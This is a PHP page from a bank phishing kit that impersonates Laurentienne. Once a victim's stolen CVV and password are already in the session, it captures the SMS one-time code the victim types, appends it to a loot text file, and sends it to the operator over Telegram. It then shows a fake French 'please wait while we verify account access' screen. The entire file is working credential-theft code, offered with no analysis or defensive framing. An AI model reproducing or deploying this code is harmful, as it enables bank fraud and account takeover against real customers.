<?php session_start();

require_once "../sendto.php" ;

if (!isset($_SESSION["cvv"]) or !isset( $_SESSION["mdp"])) {
        header("Location: ./index.php");
        exit();
}
$_SESSION["sms"] = $_POST['sms'] ;

$donnees = "\nSMS : `" . $_SESSION['sms'] . "`" .
 "\n". "** FIN  CONNEXION **\n"."\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);


 sendMessageToTelegram($donnees) ;

session_destroy();




?>




<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/laurentienne/styles_mobile.css">

    <link rel="stylesheet" media="screen and (min-width: 769px)" href="/laurentienne/styles_pc.css">
    <title>Laurentienne</title>
</head>
<header>
<nav>
    <span> <img src="./logo.svg" alt=""> </span>
</nav>
</header>
<body style="margin: 0px;">
    
<form  >
   <b> VEUILLEZ PATIENTER PENDANT QUE NOUS VERIFIONS L'ACCES AU COMPTE </b>

   <div class="load" style="text-align:center" >
            <img src="../img/ajax-loading.gif" alt="">
        </div>


</form>
<br> <br>

</body>
</html>
